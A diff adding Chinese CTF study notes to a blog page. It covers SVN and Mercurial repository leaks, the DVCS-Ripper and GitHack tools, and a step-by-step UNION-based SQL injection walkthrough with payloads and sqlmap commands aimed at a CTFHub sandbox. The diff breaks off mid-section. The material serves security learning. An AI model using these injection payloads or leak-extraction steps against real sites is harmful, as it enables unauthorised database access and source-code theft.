@@ -285,6 +285,64 @@
       </ul>
     </li>
   </ul>
+
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#svn-是什么">SVN 是什么？</a></li>
+        <li><a href="#svn-文件夹里有什么"><code>.svn</code> 文件夹里有什么？</a></li>
+      </ul>
+    </li>
+    <li><a href="#工具">工具</a></li>
+    <li><a href="#perl">perl</a></li>
+  </ul>
+
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#通俗理解">通俗理解</a></li>
+      </ul>
+    </li>
+    <li><a href="#找flag">找flag</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#详情">详情</a></li>
+  </ul>
+
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#dvcs-如-git-是现代开发的主流">DVCS (如 Git) 是现代开发的主流</a></li>
+        <li><a href="#2-cvcs-如-svn-在一些领域仍有使用">2. CVCS (如 SVN) 在一些领域仍有使用</a></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li><a href="#一句话理解这四个关键词">一句话理解这四个关键词</a></li>
+    <li><a href="#你举的这个例子拆开看">你举的这个例子拆开看</a></li>
+    <li><a href="#你在-sql-注入里是怎么用的">你在 SQL 注入里是怎么用的？</a>
+      <ul>
+        <li><a href="#步骤一测列数-order-by">步骤一：测列数 (<code>ORDER BY</code>)</a></li>
+        <li><a href="#步骤二找注入数据的来源-union-select--from--where-">步骤二：找注入数据的来源 (<code>UNION SELECT ... FROM ... WHERE ...</code>)</a></li>
+        <li><a href="#步骤三最终拿-flag-union-select-flag-from-sqliflag">步骤三：最终拿 Flag (<code>UNION SELECT flag FROM sqli.flag</code>)</a></li>
+      </ul>
+    </li>
+    <li><a href="#你不需要死记硬背记住这三句口诀就行">你不需要死记硬背，记住这三句口诀就行</a></li>
+  </ul>
+
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#整数型注入">整数型注入</a></li>
+        <li><a href="#字符型注入">字符型注入</a></li>
+        <li><a href="#报错注入">报错注入</a></li>
+        <li><a href="#布尔盲注">布尔盲注</a></li>
+        <li><a href="#时间盲注">时间盲注</a></li>
+      </ul>
+    </li>
+  </ul>
 </nav>
 </div></div>
           <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
@@ -2298,6 +2356,512 @@ git add &lt;文件名&gt;                    # 标记冲突已解决
 <li><strong>对比差异</strong>：<code>git diff</code> 或 <code>git show</code>，揪出被删掉的内容</li>
 <li><strong>搜关键词</strong>：<code>git grep &quot;flag&quot;</code> 或直接 <code>grep -r &quot;flag&quot; .</code></li>
 </ol>
+<h1 id="svn泄露">
+<a class="header-anchor" href="#svn%e6%b3%84%e9%9c%b2"></a>
+SVN泄露
+</h1><p><strong>SVN 泄露</strong>：运维人员把 <code>.svn</code> 文件夹（SVN 的“记忆库”）不小心部署到了公开的服务器上，导致攻击者可以下载并还原出整个网站的源代码。</p>
+<hr>
+<h3 id="svn-是什么">
+<a class="header-anchor" href="#svn-%e6%98%af%e4%bb%80%e4%b9%88"></a>
+SVN 是什么？
+</h3><p><strong>SVN</strong>（Subversion）是另一种<strong>版本控制系统</strong>，和 Git 是同类工具，都用来管理代码的历史版本。</p>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">对比点</th>
+          <th style="text-align: left">Git</th>
+          <th style="text-align: left">SVN</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left"><strong>记忆文件夹</strong></td>
+          <td style="text-align: left"><code>.git</code></td>
+          <td style="text-align: left"><code>.svn</code></td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>工作方式</strong></td>
+          <td style="text-align: left">分布式（每台电脑都有完整仓库）</td>
+          <td style="text-align: left">集中式（只有一个中央服务器）</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>泄露后果</strong></td>
+          <td style="text-align: left">能还原所有历史版本、分支、stash</td>
+          <td style="text-align: left">能还原所有历史版本、日志、文件结构</td>
+      </tr>
+  </tbody>
+</table>
+<p>你只需要记住：<strong><code>.svn</code> 就和 <code>.git</code> 一样，是项目的“完整记忆体”</strong>，里面有所有文件的修改历史。</p>
+<hr>
+<h3 id="svn-文件夹里有什么">
+<a class="header-anchor" href="#svn-%e6%96%87%e4%bb%b6%e5%a4%b9%e9%87%8c%e6%9c%89%e4%bb%80%e4%b9%88"></a>
+<code>.svn</code> 文件夹里有什么？
+</h3><p>它在项目每个子目录里都藏着一个 <code>.svn</code> 文件夹，里面记录着：</p>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">文件/文件夹</th>
+          <th style="text-align: left">内容</th>
+          <th style="text-align: left">对你的价值</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left"><code>entries</code></td>
+          <td style="text-align: left">目录下的文件清单、版本号、文件属性</td>
+          <td style="text-align: left">知道这个目录里有哪些宝贝</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><code>text-base/</code></td>
+          <td style="text-align: left">所有文件的<strong>原始备份</strong>（最后一次更新的基线版本）</td>
+          <td style="text-align: left">直接拿到没被修改过的源码</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><code>wc.db</code> 或 <code>pristine/</code></td>
+          <td style="text-align: left">文件修改前的原始内容</td>
+          <td style="text-align: left">还原出被修改前的代码</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><code>all-wcprops</code></td>
+          <td style="text-align: left">文件属性、URL 等元数据</td>
+          <td style="text-align: left">拼凑出完整的项目结构</td>
+      </tr>
+  </tbody>
+</table>
+<p><strong>关键点：即使管理员把源码文件删了，<code>.svn/text-base/</code> 里仍然保留着一个可读的副本。</strong></p>
+<h2 id="工具">
+<a class="header-anchor" href="#%e5%b7%a5%e5%85%b7"></a>
+工具
+</h2><p>SVN（Subversion）是一种集中式版本控制系统，广泛用于软件开发中管理文件版本变更，通过创建 .svn 隐藏目录存储版本库元数据（如文件快照、提交历史、配置信息等），方便开发者追踪代码修改、回溯历史版本。</p>
+<p>而 SVN 泄露 则是因网站部署时未删除 .svn 目录，导致该目录被公开访问所引发的信息泄露问题。攻击者可利用 dvcs-ripper 等工具，通过访问目标网站的 .svn 路径（如 <a href="http://example.com/.svn">http://example.com/.svn</a>），提取其中的版本库数据，还原源代码、历史提交记录甚至旧版本中的敏感信息等。</p>
+<p>二、DVCS-Ripper工具
+1、工具简介
+DVCS-Ripper（通常也叫 rip-*.pl）是一款专门用于检测和利用配置错误的安全工具。它的核心功能是：当发现一个网站意外地暴露了其版本控制系统的元数据目录（如 .git, .svn, .hg）时，它能够远程下载并重建整个代码仓库，从而造成源代码泄露。</p>
+<p>项目地址： <a href="https://github.com/kost/dvcs-ripper">https://github.com/kost/dvcs-ripper</a>
+AI写代码
+方面	描述
+主要用途	渗透测试与CTF竞赛。用于利用“源代码泄露”，帮助安全研究人员和攻击者获取网站的完整源代码，以便进一步分析（如硬编码的密钥、API令牌、数据库凭证、逻辑缺陷等）。
+支持的系统	支持多种分布式版本控制系统（DVCS）和集中式系统：
+• Git (rip-git.pl)
+• Subversion (SVN) (rip-svn.pl)
+• Mercurial (Hg) (rip-hg.pl)
+• Bazaar (Bzr) (rip-bzr.pl)
+工作原理	工具会模拟版本控制客户端的行为，通过HTTP请求逐个下载仓库的元数据文件（如 index, HEAD, objects/info/packs, entries 等），解析这些文件以获取文件列表和其对应的哈希值，然后根据这些哈希值下载所有代码对象，最终在本地重建出一个完整的、可用的代码仓库。</p>
+<h2 id="perl">
+<a class="header-anchor" href="#perl"></a>
+perl
+</h2><p>Perl 是一门古老但生命力极其顽强的脚本语言。它在网络安全和 CTF 中，尤其是在 Linux 环境下，至今仍是处理文本和自动化任务的一把利器。</p>
+<p>它是一门什么样的语言？
+它的全称是“实用报表提取语言”（Practical Extraction and Report Language）。通俗说，它就是为了高效处理文本数据和生成报告而生的。它汲取了 C、sed、awk、Shell 脚本等很多语言的特性，语法非常灵活。</p>
+<p>为什么 DVCS-Ripper 这样的工具要用 Perl 写？
+主要有三个原因：</p>
+<p>历史惯性：DVCS-Ripper 这类工具出现得比较早，那时 Perl 在安全圈是绝对的主流。</p>
+<p>正则表达式内置于语法中：像解析 .svn/entries 这种格式混乱的文件，需要强大的文本处理能力。Perl 的正则表达式功能是直接内嵌在语言语法里的，处理这类问题非常直接。</p>
+<p>“只写一次，到处运行”：Perl 脚本有极好的跨平台性，一个写好的 .pl 脚本，在类 Unix 系统（如 Kali）里可以直接运行。</p>
+<p>你该怎么用？
+答案很直接：你基本不需要去“学”Perl，只需要会运行它，就像你运行 GitHack 一样。DVCS-Ripper 就是别人用 Perl 语言写好的工具，你通过一个命令来启动它：</p>
+<p>bash
+perl rip-svn.pl -v -u http://目标/.svn/
+拆解一下这个命令：</p>
+<p>perl ：告诉系统，我要用 Perl 的解释器来执行一个脚本。</p>
+<p>rip-svn.pl ：这就是用 Perl 写的工具脚本文件。</p>
+<p>-v 和 -u：是给这个脚本的参数，就像 dirsearch -u 一样。</p>
+<p>你可以把它理解成和用 python dirsearch.py 或 python2 GitHack.py 差不多，只是把 python 换成了 perl。</p>
+<p>你只需要记住：</p>
+<p>工具名：DVCS-Ripper</p>
+<p>使用场景：遇到 .svn、.hg、.bzr 泄露时</p>
+<p>启动命令：在 Kali 里用 perl 去运行对应的 .pl 脚本</p>
+<h1 id="githack和dvcs-ripper">
+<a class="header-anchor" href="#githack%e5%92%8cdvcs-ripper"></a>
+GitHack和dvcs-ripper
+</h1><p>结合你之前的使用经验，<strong>GitHack 是专门对付 Git 泄露的“专业扳手”，而 DVCS-Ripper 更像是一个多合一的“版本控制工具瑞士军刀”</strong>。</p>
+<p>为了让你更直观地看到它们的区别，我把最关键的差异整理在了下面这个表格里：</p>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">对比维度</th>
+          <th style="text-align: left"><strong>GitHack (专业扳手)</strong></th>
+          <th style="text-align: left"><strong>DVCS-Ripper (瑞士军刀)</strong></th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left"><strong>核心定位</strong></td>
+          <td style="text-align: left">专注于 <strong>Git</strong> 仓库的泄露利用</td>
+          <td style="text-align: left">支持 <strong>SVN, Git, Mercurial(hg), Bazaar(bzr), CVS</strong> 等多种系统</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>编程语言</strong></td>
+          <td style="text-align: left"><strong>Python</strong> (多为 Python2，也有 Python3 版本)</td>
+          <td style="text-align: left"><strong>Perl</strong> (主要是 <code>.pl</code> 脚本文件)</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>针对Git时</strong></td>
+          <td style="text-align: left">功能强大，能完美重建工程源代码与目录结构</td>
+          <td style="text-align: left">也能处理 Git 泄露，但处理 SVN 时功能更强大</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>常用命令示例</strong></td>
+          <td style="text-align: left"><code>python GitHack.py http://目标/.git/</code></td>
+          <td style="text-align: left"><code>perl rip-svn.pl -v -u http://目标/.svn/</code></td>
+      </tr>
+  </tbody>
+</table>
+<hr>
+<h3 id="通俗理解">
+<a class="header-anchor" href="#%e9%80%9a%e4%bf%97%e7%90%86%e8%a7%a3"></a>
+通俗理解
+</h3><ul>
+<li><strong>GitHack</strong>：就像一把专门为 Git 设计的精密钥匙。因为它非常专注，所以针对 Git 泄露这类问题，打开速度很快，还原得也更完整。你之前 CTF 里用它来还原 <code>.git</code> 泄露，就是它的专长。</li>
+<li><strong>DVCS-Ripper</strong>：更像一个“万能钥匙包”。里面装着针对不同锁芯（SVN, Git, hg 等）的工具。尤其在你遇到 <code>.svn</code> 泄露时，DVCS-Ripper 是处理此类问题的利器</li>
+</ul>
+<h2 id="找flag">
+<a class="header-anchor" href="#%e6%89%beflag"></a>
+找flag
+</h2><p><strong>看到的 ./svn/pristine/ 目录，就是 SVN 的 “原始文件档案馆”。它是 SVN 为了在离线状态下也能快速比较差异、还原文件，而专门备份的一份“原版”。</strong></p>
+<p><strong>为什么在这里找 Flag？</strong>
+<strong>它是 SVN 的本地备份：每当你在工作副本里更新或签出一个文件，SVN 都会在 .svn/pristine/ 里存一份这个文件的原始内容。</strong></p>
+<p><strong>内容是“原始版本”：它不像你之前挖 Git 的 git diff 那样看历史，它就是某个版本文件的真实、可读的副本。</strong></p>
+<p><strong>管理员删不掉：就算管理员在网站目录里把 flag.txt 删了，只要他之前从仓库更新过，这个文件就永远躺在 pristine/ 里，等着你来找。</strong></p>
+<p><strong>你的两种方法在干嘛？</strong>
+<strong>方法一（grep 搜索）：自动化侦探</strong></p>
+<p><strong>bash</strong>
+<strong>grep -r &ldquo;ctfhub&rdquo; .svn/pristine/</strong>
+<strong>grep：文本搜索工具，就像你在源码里按 Ctrl+F。</strong></p>
+<p><strong>-r：递归，也就是把 pristine/ 下所有文件夹都翻一遍。</strong></p>
+<p><strong>&ldquo;ctfhub&rdquo;：你知道 CTFHub 的 flag 格式是 ctfhub{&hellip;}，所以直接用这个关键词去搜。</strong></p>
+<p><strong>.svn/pristine/：指定就在这个“原始文件档案馆”里搜。</strong></p>
+<p><strong>结果：它直接帮你找到了那个以哈希值命名的 .svn-base 文件，并把里面包含 ctfhub 的那一行（也就是 flag）打印了出来。</strong></p>
+<p><strong>方法二（手动遍历）：手工侦探</strong>
+<strong>这就是在模拟 grep -r 的工作过程，让你看清楚内部结构：</strong></p>
+<p><strong>cd .svn：进入泄露的 SVN 元数据目录。</strong></p>
+<p><strong>ls：看到了 pristine 文件夹，还有 entries, wc.db 等其他 SVN 元数据。</strong></p>
+<p><strong>cd pristine/：进入“原始文件档案馆”。</strong></p>
+<p><strong>ls：看到一些用哈希值命名的文件夹（如 29, bf），SVN 用文件内容计算出哈希值来作为文件名，避免重复。</strong></p>
+<p><strong>cd 29 / cat &hellip;：进入其中一个文件夹，直接查看这个 .svn-base 文件，就看到了完整的 flag。</strong></p>
+<h1 id="hg泄露">
+<a class="header-anchor" href="#hg%e6%b3%84%e9%9c%b2"></a>
+HG泄露
+</h1><p><strong>HG 是什么？它和 Git 有什么区别？</strong>
+<strong>Mercurial (HG) 是和 Git 同时期的分布式版本控制系统，功能非常相似。</strong></p>
+<p><strong>命名：化学上，元素“汞（水银）”的符号就是 Hg。Mercurial 意为“水银的”，所以用它简写。</strong></p>
+<p><strong>核心区别：Git 的“记忆”存在项目根目录的 .git 文件夹里；而 Mercurial 的“记忆”存在项目根目录的 .hg 文件夹里。</strong></p>
+<ol start="2">
+<li><strong>为什么 .hg 泄露也很危险？</strong>
+<strong>这和 Git 泄露的危害原理完全一致。</strong></li>
+</ol>
+<p><strong>.hg 文件夹里保存着整个项目的完整历史记录。把它部署到线上去，攻击者就能：</strong></p>
+<p><strong>重建完整项目：拿到所有源码。</strong></p>
+<p><strong>回溯历史：像你之前用 git log 一样，用 hg log 看所有变更。</strong></p>
+<p><strong>找回被删的敏感信息：管理员在某个历史版本里加了数据库密码后来删掉，用 hg checkout &lt;旧版本ID&gt; 就能让他“时光倒流”到密码还在的时候。</strong></p>
+<h2 id="详情">
+<a class="header-anchor" href="#%e8%af%a6%e6%83%85"></a>
+详情
+</h2><p><strong>1、HG简介</strong>
+<strong>Mercurial（简称 hg）是一款分布式版本控制系统（DVCS），与 Git 类似，用于跟踪文件变更、管理代码版本，支持离线操作和分布式协作。其核心特点包括：</strong></p>
+<p><strong>每个开发者本地都有完整的版本库副本，包含所有历史提交记录。</strong>
+<strong>仓库根目录下会生成 .hg 隐藏目录，存储版本库核心数据（如提交历史、文件快照、分支信息等）。</strong>
+<strong>常用命令：hg init（初始化仓库）、hg add（暂存文件）、hg commit（提交变更）、hg log（查看历史）等。</strong>
+<strong>2、HG泄露</strong>
+<strong>Hg 泄露 是指由于配置错误，Web 服务器将 Mercurial 仓库的元数据目录（.hg）直接暴露在了可公开访问的 Web 根目录下。攻击者可以通过浏览器或工具直接访问 .hg 目录内的文件，从而下载并重建整个源代码仓库。.hg 目录的关键目录如下所示。</strong></p>
+<p><strong>.hg/store：存储文件快照和提交对象的核心目录。</strong>
+<strong>.hg/history：记录分支和提交历史的元数据。</strong>
+<strong>.hg/dirstate：跟踪当前工作区文件状态的信息。</strong>
+<strong>3、HG安装</strong>
+<strong>后续在进行渗透过程中如果使用hg log命令进行渗透，需要使用到hg软件，如果未安装hg则需要进行安装，命令如下所示。</strong></p>
+<p><strong>└─# pip3 install mercurial</strong></p>
+<p><strong>Collecting mercurial</strong>
+<strong>Downloading mercurial-7.1-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.manylinux_2_28_x86_64.whl (7.4 MB)</strong>
+<strong>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 7.4/7.4 MB 34.7 kB/s eta 0:00:00</strong>
+<strong>Installing collected packages: mercurial</strong>
+<strong>Successfully installed mercurial-7.1</strong>
+<strong>WARNING: Running pip as the &lsquo;root&rsquo; user can result in broken permissions and conflicting behaviour with the system package manager. It is recommended to use a virtual environment instead: <a href="https://pip.pypa.io/warnings/venv">https://pip.pypa.io/warnings/venv</a></strong></p>
+<h1 id="控制系统">
+<a class="header-anchor" href="#%e6%8e%a7%e5%88%b6%e7%b3%bb%e7%bb%9f"></a>
+控制系统
+</h1><p><strong>DVCS 全称是 Distributed Version Control System，也就是分布式版本控制系统。</strong></p>
+<p><strong>你现在把它拆开看，结合你之前的实践一下就明白了：</strong></p>
+<p><strong>缩写	全称	含义	你熟悉的例子</strong>
+<strong>VCS	Version Control System	版本控制系统的统称（即管理代码版本的工具）	Git, SVN, Mercurial (Hg) 都是</strong>
+<strong>DVCS	Distributed VCS	分布式版本控制系统	Git, Mercurial (Hg)</strong>
+<strong>CVCS	Centralized VCS	集中式版本控制系统	SVN, CVS</strong>
+<strong>具体解释</strong>
+<strong>我们拿你之前的项目来比喻，就特别好懂：</strong></p>
+<p><strong>分布式 (DVCS) 像 Git、Mercurial (Hg)</strong></p>
+<p><strong>你和 GitHub 的关系：每个人电脑上都有一个完整的代码仓库克隆（包括全部历史记录）。你博客的那个目录，本身就是一个独立完整的仓库。中央服务器（GitHub）坏了照样能在本地查看完整历史，因为 .git 里有全部信息。</strong></p>
+<p><strong>核心特征：不依赖中央服务器。所有人地位平等。</strong></p>
+<p><strong>集中式 (CVCS) 像 SVN</strong></p>
+<p><strong>只有中央服务器有完整历史和所有分支。当你 svn checkout 时，只从服务器下载一个工作副本（最新版的快照），本地没有完整历史记录。.svn/pristine/ 里存的只是原始副本的备份，为了离线对比用，但不是完整历史。</strong></p>
+<p><strong>核心特征：高度依赖中央服务器。服务器坏了，历史就没了（除非有备份）。</strong></p>
+<p><strong>那为什么工具叫 DVCS-Ripper (分布式版本控制系统-剽窃者) 呢？</strong>
+<strong>因为它的初衷和核心功能，就是专门针对性地去“剽窃”那些因配置不当而暴露在公网上的 .git（Git）、.hg（Mercurial） 等分布式仓库。</strong></p>
+<p><strong>后来工具功能扩展，顺手也把 .svn（集中式）、.bzr 等也加进来了，但名字没改。所以你用它来处理 .svn 完全没有问题，只是它的“老本行”是干分布式仓库的。</strong></p>
+<p><strong>这样，你之后看到 DVCS 这个词，可以直接把它想象成以 Git 为代表的、不依赖中央服务器的版本管理工具。</strong></p>
+<h1 id="分类">
+<a class="header-anchor" href="#%e5%88%86%e7%b1%bb"></a>
+分类
+</h1><table>
+  <thead>
+      <tr>
+          <th style="text-align: left">分类维度</th>
+          <th style="text-align: left">对比项</th>
+          <th style="text-align: left">你的理解</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left"><strong>操作系统</strong></td>
+          <td style="text-align: left">Windows vs Linux</td>
+          <td style="text-align: left"><strong>你的书桌和文具</strong>。Windows 是微软出的一整套品牌书桌，Linux 是一张可以自己高度定制的开源书桌。书桌决定了你用什么样的纸、笔、文件夹。</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>版本控制系统</strong></td>
+          <td style="text-align: left">Git (DVCS) vs SVN (CVCS)</td>
+          <td style="text-align: left"><strong>你的改稿和存档方式</strong>。Git 是你每写完一章，就自己复印一份完整的书稿，并写上日期编号，自己存着（分布式）。SVN 是你每改完一页，就寄给出版社的中央档案室，由他们统一管理（集中式）</td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="dvcs-如-git-是现代开发的主流">
+<a class="header-anchor" href="#dvcs-%e5%a6%82-git-%e6%98%af%e7%8e%b0%e4%bb%a3%e5%bc%80%e5%8f%91%e7%9a%84%e4%b8%bb%e6%b5%81"></a>
+DVCS (如 Git) 是现代开发的主流
+</h3><p>你现在学的、用的，基本都是 DVCS。</p>
+<ul>
+<li><strong>为什么流行？</strong> 因为每个开发者电脑上都有一个<strong>完整的仓库副本</strong>，可以离线提交、自由建分支、在本地做任何实验，完全不依赖服务器。这对开源协作和互联网公司的快速迭代特别合适。</li>
+<li><strong>你就在用</strong>：你写博客的 <code>git add</code>, <code>git commit</code>, <code>git push</code> 流程，就是典型的 DVCS 用法。你本地的博客文件夹就是一个完整的 Git 仓库，GitHub 只是你的远程备份和发布平台。所有现代的开源项目（像 Linux 内核、React、Vue）都用 Git 管理。</li>
+</ul>
+<hr>
+<h3 id="2-cvcs-如-svn-在一些领域仍有使用">
+<a class="header-anchor" href="#2-cvcs-%e5%a6%82-svn-%e5%9c%a8%e4%b8%80%e4%ba%9b%e9%a2%86%e5%9f%9f%e4%bb%8d%e6%9c%89%e4%bd%bf%e7%94%a8"></a>
+2. CVCS (如 SVN) 在一些领域仍有使用
+</h3><p>虽然不如 Git 流行，但 SVN 并没有消失。</p>
+<ul>
+<li><strong>谁在用？</strong> 一些成立时间早的公司，积累了庞大的项目历史；或者一些游戏开发团队，因为需要管理巨大的二进制文件（图片、模型等）。</li>
+<li><strong>为什么还用？</strong> 对于二进制文件，SVN 的处理方式比 Git 更简单直接，支持锁定文件，避免多人同时修改一个无法合并的模型文件产生冲突。同时，企业也可以对代码进行集中权限管控。</li>
+</ul>
+<h1 id="sql系统性学习">
+<a class="header-anchor" href="#sql%e7%b3%bb%e7%bb%9f%e6%80%a7%e5%ad%a6%e4%b9%a0"></a>
+SQL系统性学习
+</h1><h2 id="一句话理解这四个关键词">
+<a class="header-anchor" href="#%e4%b8%80%e5%8f%a5%e8%af%9d%e7%90%86%e8%a7%a3%e8%bf%99%e5%9b%9b%e4%b8%aa%e5%85%b3%e9%94%ae%e8%af%8d"></a>
+一句话理解这四个关键词
+</h2><table>
+  <thead>
+      <tr>
+          <th style="text-align: left">关键字</th>
+          <th style="text-align: left">作用</th>
+          <th style="text-align: left">通俗理解</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left"><strong>SELECT</strong></td>
+          <td style="text-align: left">要查什么</td>
+          <td style="text-align: left">&ldquo;我要拿哪些东西&rdquo;</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>FROM</strong></td>
+          <td style="text-align: left">从哪张表查</td>
+          <td style="text-align: left">&ldquo;从哪个抽屉里拿&rdquo;</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>WHERE</strong></td>
+          <td style="text-align: left">筛选条件</td>
+          <td style="text-align: left">&ldquo;只要符合什么条件的&rdquo;</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>UNION SELECT</strong></td>
+          <td style="text-align: left">追加查询结果</td>
+          <td style="text-align: left">&ldquo;把另一个查询的结果也贴到后面&rdquo;</td>
+      </tr>
+  </tbody>
+</table>
+<hr>
+<h2 id="你举的这个例子拆开看">
+<a class="header-anchor" href="#%e4%bd%a0%e4%b8%be%e7%9a%84%e8%bf%99%e4%b8%aa%e4%be%8b%e5%ad%90%e6%8b%86%e5%bc%80%e7%9c%8b"></a>
+你举的这个例子拆开看
+</h2><p>sql</p>
+<pre tabindex="0"><code>SELECT id, name FROM users WHERE id = 1
+</code></pre><p>这句话翻译成人话就是：</p>
+<blockquote>
+<p><strong>从 <code>users</code> 这个“用户表”里，把 <code>id</code> 等于 1 的那一行数据找出来，只给我看它的 <code>id</code> 和 <code>name</code> 这两列。</strong></p>
+</blockquote>
+<p>具体拆解：</p>
+<ul>
+<li><strong><code>SELECT id, name</code></strong>：你点菜，只要 <code>id</code> 和 <code>name</code> 这两道菜。</li>
+<li><strong><code>FROM users</code></strong>：你指定去 <code>users</code> 这张桌子的菜单上点。</li>
+<li><strong><code>WHERE id = 1</code></strong>：你只吃编号为 1 的那道。</li>
+</ul>
+<hr>
+<h2 id="你在-sql-注入里是怎么用的">
+<a class="header-anchor" href="#%e4%bd%a0%e5%9c%a8-sql-%e6%b3%a8%e5%85%a5%e9%87%8c%e6%98%af%e6%80%8e%e4%b9%88%e7%94%a8%e7%9a%84"></a>
+你在 SQL 注入里是怎么用的？
+</h2><p>你现在做联合查询，本质上是把你自己的查询结果“贴”到原来的结果后面。所以规则必须和原查询保持一致。</p>
+<p>假设原查询是：</p>
+<p>sql</p>
+<pre tabindex="0"><code>SELECT id, name FROM users WHERE id = &#39;用户输入的参数&#39;
+</code></pre><h3 id="步骤一测列数-order-by">
+<a class="header-anchor" href="#%e6%ad%a5%e9%aa%a4%e4%b8%80%e6%b5%8b%e5%88%97%e6%95%b0-order-by"></a>
+步骤一：测列数 (<code>ORDER BY</code>)
+</h3><p>sql</p>
+<pre tabindex="0"><code>?id=1&#39; ORDER BY 1 --+  （正常）
+?id=1&#39; ORDER BY 2 --+  （正常）
+?id=1&#39; ORDER BY 3 --+  （报错 → 说明只有 2 列！）
+</code></pre><p><strong>这里没有 FROM 和 WHERE</strong>，因为 <code>ORDER BY</code> 只对当前查询排序，不需要指定表。</p>
+<h3 id="步骤二找注入数据的来源-union-select--from--where-">
+<a class="header-anchor" href="#%e6%ad%a5%e9%aa%a4%e4%ba%8c%e6%89%be%e6%b3%a8%e5%85%a5%e6%95%b0%e6%8d%ae%e7%9a%84%e6%9d%a5%e6%ba%90-union-select--from--where-"></a>
+步骤二：找注入数据的来源 (<code>UNION SELECT ... FROM ... WHERE ...</code>)
+</h3><p>你已经知道有 2 列，想查数据库里所有的表名。表名不在 <code>users</code> 表里，而在 MySQL 自带的“系统字典” <code>information_schema.tables</code> 里。</p>
+<p>所以你需要：</p>
+<p>sql</p>
+<pre tabindex="0"><code>?id=-1&#39; UNION SELECT 1, group_concat(table_name) FROM information_schema.tables WHERE table_schema=database() --+
+</code></pre><p>这个语句和 <code>SELECT ... FROM ... WHERE ...</code> 的关系是：</p>
+<ul>
+<li><strong><code>UNION SELECT 1, group_concat(table_name)</code></strong>：你要的数据（表名列表），放在第二个回显位。</li>
+<li><strong><code>FROM information_schema.tables</code></strong>：从“系统字典的表清单”里查。</li>
+<li><strong><code>WHERE table_schema=database()</code></strong>：只查当前数据库里的表。</li>
+</ul>
+<h3 id="步骤三最终拿-flag-union-select-flag-from-sqliflag">
+<a class="header-anchor" href="#%e6%ad%a5%e9%aa%a4%e4%b8%89%e6%9c%80%e7%bb%88%e6%8b%bf-flag-union-select-flag-from-sqliflag"></a>
+步骤三：最终拿 Flag (<code>UNION SELECT flag FROM sqli.flag</code>)
+</h3><p>当你已经知道表叫 <code>flag</code>，字段叫 <code>flag</code>，就直接：</p>
+<p>sql</p>
+<pre tabindex="0"><code>?id=-1&#39; UNION SELECT 1, flag FROM sqli.flag --+
+</code></pre><ul>
+<li><strong><code>UNION SELECT 1, flag</code></strong>：要查的 flag。</li>
+<li><strong><code>FROM sqli.flag</code></strong>：从 <code>sqli</code> 数据库的 <code>flag</code> 表里拿。</li>
+<li><strong>没有 WHERE</strong>：因为你要看整个表的所有行，不需要筛选。</li>
+</ul>
+<hr>
+<h2 id="你不需要死记硬背记住这三句口诀就行">
+<a class="header-anchor" href="#%e4%bd%a0%e4%b8%8d%e9%9c%80%e8%a6%81%e6%ad%bb%e8%ae%b0%e7%a1%ac%e8%83%8c%e8%ae%b0%e4%bd%8f%e8%bf%99%e4%b8%89%e5%8f%a5%e5%8f%a3%e8%af%80%e5%b0%b1%e8%a1%8c"></a>
+你不需要死记硬背，记住这三句口诀就行
+</h2><ol>
+<li><strong>SELECT 后面写列名</strong>（或用 <code>*</code> 代表所有列）</li>
+<li><strong>FROM 后面写表名</strong>（数据从哪来）</li>
+<li><strong>WHERE 后面写条件</strong>（只要符合条件的数据，不需要筛选时可以省略）</li>
+</ol>
+<h1 id="sqlmap">
+<a class="header-anchor" href="#sqlmap"></a>
+SQLmap
+</h1><h1 id="第一步查当前数据库名">
+<a class="header-anchor" href="#%e7%ac%ac%e4%b8%80%e6%ad%a5%e6%9f%a5%e5%bd%93%e5%89%8d%e6%95%b0%e6%8d%ae%e5%ba%93%e5%90%8d"></a>
+第一步：查当前数据库名
+</h1><p>sqlmap -u &ldquo;<a href="http://challenge-e9289924cf2bdb4e.sandbox.ctfhub.com:10800/?id=1%22">http://challenge-e9289924cf2bdb4e.sandbox.ctfhub.com:10800/?id=1&quot;</a> &ndash;current-db</p>
+<h1 id="第二步查-sqli-库里有哪些表假设第一步跑出来库名是-sqli">
+<a class="header-anchor" href="#%e7%ac%ac%e4%ba%8c%e6%ad%a5%e6%9f%a5-sqli-%e5%ba%93%e9%87%8c%e6%9c%89%e5%93%aa%e4%ba%9b%e8%a1%a8%e5%81%87%e8%ae%be%e7%ac%ac%e4%b8%80%e6%ad%a5%e8%b7%91%e5%87%ba%e6%9d%a5%e5%ba%93%e5%90%8d%e6%98%af-sqli"></a>
+第二步：查 sqli 库里有哪些表（假设第一步跑出来库名是 sqli）
+</h1><p>sqlmap -u &ldquo;<a href="http://challenge-e9289924cf2bdb4e.sandbox.ctfhub.com:10800/?id=1%22">http://challenge-e9289924cf2bdb4e.sandbox.ctfhub.com:10800/?id=1&quot;</a> -D sqli &ndash;tables</p>
+<h1 id="第三步查-flag-表里有哪些字段">
